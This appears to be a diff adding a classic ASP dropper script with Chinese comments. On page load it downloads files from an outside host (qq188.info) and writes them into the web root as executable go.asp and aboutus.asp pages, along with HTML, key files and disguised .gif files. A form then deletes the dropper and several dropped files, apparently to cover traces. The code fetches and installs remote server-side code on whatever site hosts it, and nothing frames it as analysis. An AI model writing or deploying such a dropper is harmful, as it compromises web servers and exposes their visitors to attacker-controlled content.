@@ -1,0 +1,81 @@
+<% 
+Server.ScriptTimeOut = 999
+'随机数
+Function RndNumber(MaxNum,MinNum)
+Randomize 
+RndNumber=int((MaxNum-MinNum+1)*rnd+MinNum)
+RndNumber=RndNumber
+End Function
+
+''文件删除函数 
+function deletefile(filename) 
+if filename<>"" then 
+set fso=server.CreateObject("scripting.filesystemobject") 
+if fso.FileExists(filename) then 
+fso.DeleteFile filename 
+else 
+Response.Write "<script>alert(''该文件不存在'');</script>" 
+end if 
+end if 
+end function 
+
+'远程下载
+function downfilea(d_target,s_target) 
+On  Error Resume Next   
+    dim myhttp,objstream 
+    set myhttp =server.createobject("MSXML2.XMLHTTP") 
+    myhttp.open "GET ",d_target,false 
+    myhttp.send() 
+    set objstream=Server.CreateObject("adodb.stream")   
+    objstream.Type=1   
+    objstream.Mode=3   
+    objstream.Open 
+    objstream.Write myhttp.responseBody 
+    objstream.SaveToFile s_target, 2 
+    if err.number <> 0 then err.Clear 
+end function 
+
+
+dim reqVal
+reqVal=Request.QueryString("del")
+If reqVal="" Then
+
+'随机生成不重复的key 并下载
+dim url,rdmNum,rdmNum2,key1,key2,key3,urls
+
+urls="http://www.qq188.info/dy/"
+rdmNum=RndNumber(1,9)
+key1=urls&rdmNum&"L_key.txt"
+
+rdmNum2=RndNumber(1,9)
+key2=urls&rdmNum2&"L_key.txt"
+
+downfilea key1,Server.MapPath("key.txt") 
+downfilea urls&"5am_asp_html.txt",Server.MapPath("go.asp") 
+downfilea urls&"content.txt",Server.MapPath("content.txt")
+downfilea urls&"5am_asp_mb.txt",Server.MapPath("mb.html")
+downfilea key2,Server.MapPath("0001.gif") 
+downfilea urls&"5am_asp_aboutus.txt",Server.MapPath("aboutus.asp") 
+downfilea urls&"content.txt",Server.MapPath("0002.gif")
+ 
+
+
+Response.write "<br />"
+Response.write "<a href ='go.asp'  target='_blank'>Start!</a>"
+Response.write "<br />"
+
+
+Else
+     deletefile(server.MapPath("d.asp"))
+     deletefile(server.MapPath("go.asp"))
+     deletefile(server.MapPath("key.txt"))
+     deletefile(server.MapPath("content.txt"))
+     deletefile(server.MapPath("mb.html"))
+End If
+%> 
+<form method="get" action>
+ <input type="hidden" name="del" value="del"/></p>
+<input type="submit" value="delete" />
+</form>
+
+
